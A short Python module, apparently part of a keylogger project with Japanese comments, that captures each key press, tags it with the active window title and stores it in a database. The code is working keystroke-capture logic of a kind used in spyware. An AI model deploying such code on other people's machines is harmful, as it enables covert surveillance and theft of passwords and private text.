import pygetwindow as gw
from pynput import keyboard
from src.database import session
from src.database.models.key_logger.application_log import ApplicationLog


def get_active_window_info():
    active_window = gw.getActiveWindow()
    if active_window:
        return active_window.title, active_window.topleft
    return None, None


def get_active_application():
    active_window = gw.getActiveWindow()
    if active_window:
        return active_window.title, active_window.process.name()
    return None, None


def on_press(key):
    try:
        key_char = key.char  # 通常のキーを取得
    except AttributeError:
        key_char = str(key)  # 特殊キー（Shift、Ctrlなど）を文字列に変換

    # フォーカスされているウィンドウとタイトルを取得
    window_title, _ = get_active_window_info()

    # アプリケーションログをデータベースに保存
    log_entry = ApplicationLog(
        application_name="YourApp",  # 自身のアプリケーション名を設定
        window_title=window_title or "Unknown",
        url="http://example.com",  # ブラウザの場合にURLを記録
        input_text=key_char,
        context="Form Input"  # 入力コンテキストを指定
    )
    session.add(log_entry)
    session.commit()
    print(f"Logged: {key_char} in {window_title}")

